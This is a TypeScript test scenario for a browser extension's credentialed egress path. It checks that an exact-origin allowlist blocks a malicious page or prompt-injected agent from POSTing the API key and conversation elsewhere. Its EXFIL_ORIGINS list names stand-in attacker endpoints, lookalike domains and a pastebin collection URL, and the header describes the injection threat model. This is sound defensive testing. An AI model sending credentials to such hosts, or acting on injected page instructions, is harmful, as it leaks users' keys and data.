// Scenario 01 — malicious webpage tries to exfiltrate the API key.
//
// Adversary: a malicious page (or a prompt-injected agent acting on its behalf)
// wants the vault's model-provider API key POSTed somewhere it can read it.
//
// The credentialed path (this scenario): the ONLY code that attaches the key is
// the provider adapter, and every such call goes through `safeFetch`, which
// enforces an EXACT-ORIGIN allowlist and fails closed on redirects. So the key
// can only ride a request to a provider origin already on the list, and that
// request cannot be bounced elsewhere by a 3xx. There is no wildcard to abuse:
// `api.anthropic.com.evil.example` and `evil.api.anthropic.com` are different
// origins and are refused.
//
// The complementary defense — the OPEN-WEB path (fetch_url) is allowlist-free
// but KEYLESS, so an injected page has no key to launder out — is proven by
// scenario 03 (secret summarization) and scenario 08 (injection benchmark).
// safe-fetch.js is explicit that it is a partial control; we test exactly the
// part it owns.

import {
  type Scenario, type Probe, blocked, leaked, summarize,
} from '../harness.ts';
import { makeSafeFetch, originOf, isAllowed, HARDCODED_ALLOWLIST } from '../../../extension/peerd-egress/fetch/safe-fetch.js';
import { EgressDeniedError } from '../../../extension/peerd-egress/fetch/errors.js';

const PROVIDER = 'https://api.anthropic.com';

// A safeFetch pinned to a single provider origin, with the network wire tapped
// so an exfil attempt that somehow slips through is observable.
const armSafeFetch = (over: any = {}) => {
  let sentTo: string | null = null;
  const safeFetch = makeSafeFetch({
    getAllowlist: () => [PROVIDER],
    audit: async () => {},
    fetchFn: (async (resource: any) => { sentTo = originOf(resource); return new Response('ok', { status: 200 }); }) as any,
    ...over,
  });
  return { safeFetch, sentTo: () => sentTo };
};

// Hostile destinations a page/adapter might try to POST the key + conversation to.
const EXFIL_ORIGINS = [
  { label: 'attacker collection endpoint', url: 'https://evil.example/collect' },
  { label: 'lookalike suffix (api.anthropic.com.evil.example)', url: 'https://api.anthropic.com.evil.example/v1/messages' },
  { label: 'attacker subdomain of a lookalike', url: 'https://evil.api-anthropic.com/v1/messages' },
  { label: 'plaintext downgrade of the provider origin', url: 'http://api.anthropic.com/v1/messages' },
  { label: 'provider host on an off-origin port', url: 'https://api.anthropic.com:8443/v1/messages' },
  { label: 'raw pastebin C2', url: 'https://pastebin.com/api/api_post.php' },
];

export const scenario: Scenario = {
  id: '01-api-key-exfiltration',
  title: 'API-key exfiltration (credentialed provider path)',
  adversary: 'malicious webpage',
  asset: 'model-provider API key + conversation',
  claim: 'The credentialed egress path (safeFetch) only reaches an exact-origin provider allowlist and fails closed on redirects, so the key + conversation cannot be POSTed to an attacker origin.',
  threatModelRef: 'INV-1',
  tier: 'unit',
  async run() {
    const probes: Probe[] = [];

    // 1) Every hostile destination must be refused AND must never hit the wire.
    for (const t of EXFIL_ORIGINS) {
      const { safeFetch, sentTo } = armSafeFetch();
      let denied: unknown = null;
      try {
        await safeFetch(t.url, { method: 'POST', body: JSON.stringify({ conversation: '...', key: 'sk-ant-STOLEN' }) });
      } catch (e) { denied = e; }
      const isDenied = denied instanceof EgressDeniedError;
      probes.push(isDenied && sentTo() === null
        ? blocked(`POST key+conversation to ${t.label}`, `EgressDeniedError(${originOf(t.url)}); fetchFn never fired`)
        : leaked(`POST key+conversation to ${t.label}`, isDenied ? `denied but wire touched: ${sentTo()}` : `NOT denied: ${String(denied)}`));
    }

    // 2) Exact-origin matcher must reject lookalikes but accept the real provider.
    {
      const okReal = isAllowed(originOf(`${PROVIDER}/v1/messages`), [PROVIDER]);
      const rejectsLookalike = !isAllowed(originOf('https://api.anthropic.com.evil.example/'), [PROVIDER]);
      probes.push(okReal && rejectsLookalike
        ? blocked('substring/suffix confusion against the exact-origin allowlist', 'isAllowed accepts the real origin, rejects the lookalike')
        : leaked('substring/suffix confusion against the exact-origin allowlist', `okReal=${okReal} rejectsLookalike=${rejectsLookalike}`));
    }

    // 3) A provider origin that 3xx-redirects toward an attacker must fail closed
    //    — the credentialed request cannot be bounced off the approved origin.
    {
      const { safeFetch } = armSafeFetch({
        fetchFn: (async () => new Response(null, { status: 302, headers: { location: 'https://evil.example/' } })) as any,
      });
      let reason: string | null = null;
      try { await safeFetch(`${PROVIDER}/v1/messages`, { method: 'POST' }); }
      catch (e: any) { reason = e?.reason ?? null; }
      probes.push(reason === 'redirect_blocked'
        ? blocked('provider origin 302-redirects the credentialed call to an attacker', 'EgressDeniedError reason=redirect_blocked')
        : leaked('provider origin 302-redirects the credentialed call to an attacker', `redirect not refused (reason=${reason})`));
    }

    // 4) Sanity: the allowlist is not empty / deny-all — a legit provider call passes.
    {
      const { safeFetch, sentTo } = armSafeFetch();
      const res = await safeFetch(`${PROVIDER}/v1/messages`, { method: 'POST' });
      const ok = res.status === 200 && sentTo() === PROVIDER;
      const hardcodedIsExactOrigin = HARDCODED_ALLOWLIST.every((o: string) => o === originOf(o) || o.startsWith('http'));
      probes.push(ok && hardcodedIsExactOrigin
        ? blocked('control: the defense is a real allowlist, not deny-all', `legit provider call reached ${sentTo()} (200); HARDCODED_ALLOWLIST is exact-origin`)
        : leaked('control: the defense is a real allowlist, not deny-all', `ok=${ok} hardcodedIsExactOrigin=${hardcodedIsExactOrigin}`));
    }

    return summarize(probes, ['safeFetch exact-origin allowlist', 'isAllowed (no wildcard match)', 'redirect fail-closed']);
  },
};
